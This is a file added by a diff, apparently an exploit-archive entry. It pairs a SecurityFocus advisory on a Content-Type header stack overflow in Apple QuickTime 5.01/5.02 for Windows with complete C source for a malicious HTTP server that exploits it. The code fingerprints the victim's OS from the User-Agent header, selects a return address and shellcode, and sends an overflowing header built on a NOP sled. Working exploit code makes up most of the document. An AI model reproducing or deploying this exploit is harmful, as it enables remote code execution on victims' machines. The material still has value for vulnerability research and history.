@@ -1,0 +1,162 @@
+source: http://www.securityfocus.com/bid/4064/info
+
+Apple QuickTime is a freely available media player. It runs on a number of platforms including MacOS and Windows 9x/ME/NT/2000/XP operating systems.
+
+Apple QuickTime For Windows does not perform sufficient bounds checking of the "Content-Type" header. This issue may be exploited if a server responds with a maliciously crafted "Content-Type" header to a HTTP request for a media file. A "Content-Type" header of 500+ characters is sufficient to trigger this condition, causing stack variables to be overwritten in the process.
+
+This issue may allow a malicious server to execute arbitrary attacker-supplied code on the host of a client who makes a request for a media file. This may result in a remote compromise, possibly with elevated privileges (depending on the environment). This issue may also allow a hostile server to introduce malicious code into a system running the vulnerable software.
+
+Exploitation of this issue requires that a user makes a request to the malicious server. However, this may also be exploited by a malicious host that is serving streaming media content to the client.
+
+It should be noted that the QuickTime player broadcasts information about the version and the operating environment via the "User-Agent" header of the HTTP request, which may aid a malicious server in successfully exploiting this issue.
+
+This vulnerability was reported for Japanese versions of Apple QuickTime Player, running on Japanese versions of the Microsoft Operating System. It is not known if other versions and environments are affected. 
+
+/*======================================================================
+   Apple QuickTimePlayer 5.02/5.01 Exploit
+     for Windows XP Home edition
+         Windows2000 Professional (Service Pack 2)
+         Windows98 Second Edition
+   The Shadow Penguin Security (http://www.shadowpenguin.org)
+   Written by UNYUN (unyun@shadowpenguin.org)
+  =======================================================================
+*/
+#include <windows.h>
+#include <windowsx.h>
+#include <stdio.h>
+#include <winsock.h>
+
+#define SERVICE_PORT    2222
+#define MAXBUF          4096
+#define TGTBUFSIZE      500
+#define NOP             0x90
+#define RETOFS          456
+#define CODEOFS         470
+#define RETADR_2000pro  0x77e0af64
+#define RETADR_XPhome   0x77e4fb71
+#define RETADR_98SE     0xbfb92995
+
+#define UA_2000PRO      "Windows NT 5.0Service Pack 2"
+#define UA_XPHOME       "Windows NT 5.1"
+#define UA_98SE         "Windows 98 A "
+
+#define ANSWER \
+"HTTP/1.1 200 OK\r\n"\
+"Date: Wed, 06 Feb 2002 06:56:30 GMT\r\n"\
+"Server: Apache/1.3.19\r\n"\
+"Last-Modified: Tue, 15 May 2001 13:37:51 GMT\r\n"\
+"ETag: \"1e001d-7b5-3b01312f\"\r\n"\
+"Accept-Ranges: bytes\r\n"\
+"Content-Length: 1973\r\n"\
+"Content-Type: %s\r\n\r\n"
+
+static unsigned char egg_2000pro[512]={
+  0xB8,0xA5,0xFA,0xE1,0x77,0x33,0xDB,0xB3,
+  0x04,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD
+};
+static unsigned char egg_XPhome[512]={
+  0xB8,0xe3,0x02,0xd4,0x77,0x33,0xDB,0xB3,
+  0x04,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD
+};
+static unsigned char egg_98se[512]={
+  0xB8,0x2c,0x23,0xf5,0xbf,0x33,0xDB,0xB3,
+  0x05,0x53,0x53,0xFF,0xD0,0x90,0xEB,0xFD
+};
+
+int main(int argc,char *argv[])
+{
+    WSADATA         wsa;
+    SOCKADDR_IN     sAddr,clientAddr;
+    SOCKET          sock_listen,sock;
+    int             nClientAddrLen=sizeof(clientAddr);
+    static char     packetbuf[MAXBUF*2];
+    static char     buf[MAXBUF],recvbuf[MAXBUF];
+    int             r;
+    unsigned int    eip;
+    char            *p,*q,*qtver,*os;
+    unsigned char   *egg;
+
+    // Create socket and wait connection
+    WSAStartup(MAKEWORD(2,0),&wsa);
+    sock_listen=socket(AF_INET,SOCK_STREAM,0);
+    sAddr.sin_family        = AF_INET;
+    sAddr.sin_addr.s_addr   = htonl(INADDR_ANY);
+    sAddr.sin_port          = htons((u_short)(SERVICE_PORT));
+    bind(sock_listen,(SOCKADDR *)&sAddr,sizeof(sAddr));
+    listen(sock_listen,1);
+    printf("Waiting connection (Port %d)...\n",SERVICE_PORT);
+    sock=accept(sock_listen,(LPSOCKADDR)&clientAddr,&nClientAddrLen);
+    printf("Accepted [from %s].\n",inet_ntoa(clientAddr.sin_addr));
+
+    // Recv request
+    if ((r=recv(sock,recvbuf,sizeof(recvbuf)-1,0))==SOCKET_ERROR){
+        printf("Can not recv packet\n");
+        return(0);
+    }
+    recvbuf[r]='\0';
+    printf("---request------------------------------\n");
+    printf("%s\n",recvbuf);
+    printf("----------------------------------------\n");
+    if ((p=strstr(recvbuf,"User-Agent:"))==NULL){
+        printf("Can not select\n");
+        printf("%s\n",recvbuf);
+        exit(1);
+    }
+    if ((q=strchr(p,'\r'))!=NULL) *q='\0';
+    if ((qtver=strstr(p,"qtver="))==NULL){
+        printf("Version is not written in User-Agent\n");
+        printf("%s\n",p);
+        exit(1);
+    }
+    qtver+=6;
+    if ((q=strchr(qtver,';'))!=NULL) *q='\0';
+    printf("Client version = '%s'\n",qtver);
+    q++;
+    if ((p=strchr(q,')'))!=NULL) *p='\0';
+    if ((os=strstr(q,"os="))==NULL){
+        printf("OS name is not written in User-Agent\n");
+        printf("%s\n",q);
+        exit(1);
+    }
+    os+=3;
+    printf("Client OS = '%s'\n",os);
+
+    if (!strcmp(os,UA_XPHOME)){
+        eip=RETADR_XPhome;
+        egg=egg_XPhome;
+        printf("Target = WindowsXp Home\n");
+    }else if (!strcmp(os,UA_2000PRO)){
+        eip=RETADR_2000pro;
+        egg=egg_2000pro;
+        printf("Target = Windows2000 Professional (SP2)\n");
+    }else if (!strcmp(os,UA_98SE)){
+        eip=RETADR_98SE;
+        egg=egg_98se;
+        printf("Target = Windows98 Second Edition\n");
+    }else{
+        eip=RETADR_2000pro;
+        egg=egg_2000pro;
+        printf("Target = Unknown.\n");
+    }
+
+    // Make exploit
+    memset(buf,NOP,sizeof(buf));
+    buf[RETOFS  ]=eip&0xff;
+    buf[RETOFS+1]=(eip>>8)&0xff;
+    buf[RETOFS+2]=(eip>>16)&0xff;
+    buf[RETOFS+3]=(eip>>24)&0xff;
+    strncpy(buf+CODEOFS,egg,strlen(egg));
+    buf[TGTBUFSIZE]='\0';
+
+    // Send exploit
+    sprintf(packetbuf,ANSWER,buf);
+    if (send(sock,packetbuf,strlen(packetbuf),0)==SOCKET_ERROR){
+        printf("Can not send packet\n");
+        return(0);
+    }
+
+    Sleep(1000);
+    closesocket(sock);
+    printf("Done\n");
+    return(0);
+}
